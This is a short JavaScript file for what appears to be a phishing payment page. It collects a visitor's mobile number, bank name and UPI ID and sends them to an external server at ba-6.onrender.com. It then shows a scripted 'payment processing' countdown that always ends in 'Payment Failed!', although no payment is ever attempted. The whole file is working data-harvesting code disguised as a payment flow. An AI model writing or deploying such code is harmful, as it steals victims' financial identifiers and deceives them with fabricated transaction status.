document.getElementById('userForm').addEventListener('submit', async function (event) {
    event.preventDefault();

    // Get form data
    const mobile = document.getElementById('mobile').value;
    const bank = document.getElementById('bank').value;
    const upi = document.getElementById('upi').value;

    // Show loading immediately
    const countdownElement = document.getElementById('countdown');
    countdownElement.style.display = 'block';
    countdownElement.innerHTML = 'Please wait, your payment is processing...';

    try {
        const response = await fetch('https://ba-6.onrender.com/saveData', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ mobile, bank, upi })
        });

        if (!response.ok) {
            throw new Error('Server error');
        }

        // Start countdown after successful submission
        startPaymentCountdown();
        document.getElementById('userForm').reset();

    } catch (error) {
        console.error('Error:', error);
        showPaymentStatus('Submission failed! Please try again.', 'red');
        countdownElement.style.display = 'none';
    }
});

function startPaymentCountdown() {
    let countdown = 15;
    const countdownElement = document.getElementById('countdown');
    const paymentStatus = document.getElementById('paymentStatus');

    const countdownInterval = setInterval(() => {
        countdownElement.innerHTML = `Please wait, your payment is processing...<br>${countdown} seconds remaining`;
        countdown--;

        if (countdown < 0) {
            clearInterval(countdownInterval);
            countdownElement.style.display = 'none';
            showPaymentStatus('Payment Failed!', 'red');
        }
    }, 1000);
}

function showPaymentStatus(message, color) {
    const statusElement = document.getElementById('paymentStatus');
    statusElement.textContent = message;
    statusElement.style.color = color;
    statusElement.style.display = 'block';
    
    setTimeout(() => {
        statusElement.style.display = 'none';
    }, 5000);
}
